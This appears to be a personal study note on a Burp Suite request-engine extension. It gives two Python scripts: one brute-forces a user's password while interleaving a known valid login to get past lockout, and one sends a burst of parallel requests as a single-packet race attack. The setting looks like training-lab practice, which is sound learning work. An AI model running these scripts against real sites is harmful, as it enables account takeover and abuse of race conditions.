---
tags:
  - web
  - security
---
A [[Burp Suite]] extension to improve the speed of requests with [[Burp Suite Intruder]].
# Request Format
- `%s` to be a replacement 
# [[Brute Force Valid Credential Technique]]
```python
import re

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)

    counter = 0
    for word in open('/usr/share/wordlists/burp_suite_pwds.txt'):
        if (counter >= 2):
            counter = 0
        engine.queue(target.req, ["wiener", "peter"])
        engine.queue(target.req, ["carlos", word.rstrip()])
        counter += 1


def handleResponse(req, interesting):
    wienerbool = bool(re.search(r"wiener", req.request))
	
	# string for the timeout regex    
    is_match = str(bool(re.search(r"1 minute", req.response)))
    if not wienerbool:
	    req.label = is_match # used to help with search
        table.add(req)
```
# Single Packet Attack
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```